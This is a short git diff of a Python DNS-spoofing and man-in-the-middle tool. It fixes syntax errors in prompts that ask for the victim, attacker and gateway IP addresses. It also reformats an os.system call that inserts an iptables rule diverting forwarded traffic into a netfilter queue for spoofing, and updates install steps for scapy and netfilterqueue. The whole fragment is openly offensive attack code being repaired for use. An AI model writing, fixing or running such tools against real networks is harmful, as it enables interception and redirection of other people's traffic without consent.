@@ -104,19 +104,19 @@ def forward_packet(packet, macVictimList, ipVictimList, macAttacker):
 # git clone git@github.com:kti/python-netfilterqueue.git
 # cd python-netfilterqueue
 # sudo apt-get install python3-dev
-# python setup.py install
+# sudo python3 setup.py install
 
 # pip3 install scapy
 # pip3 install netfilterqueue 
 def dns_spoof():
     # The user needs to input the ipVictim
-    ipVictim = raw_input("The IP address of the victim: "))
+    ipVictim = raw_input("The IP address of the victim: ")
 
     # The user needs to input the ipAttacker
-    ipAttacker = raw_input("The IP address of the attacker: "))
+    ipAttacker = raw_input("The IP address of the attacker: ")
 
     # The user needs to input the ipGatewayRouter
-    ipGatewayRouter = raw_input("The IP address of the gateway router: "))
+    ipGatewayRouter = raw_input("The IP address of the gateway router: ")
 
     class DnsSnoof:
         def __init__(self, dns_hosts, queueNum):
@@ -126,8 +126,7 @@ def dns_spoof():
   
         def __call__(self):
             log.info("Snoofing....")
-            os.system(
-                f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
+            os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
             self.queue.bind(self.queueNum, self.callBack)
             try:
                 self.queue.run()
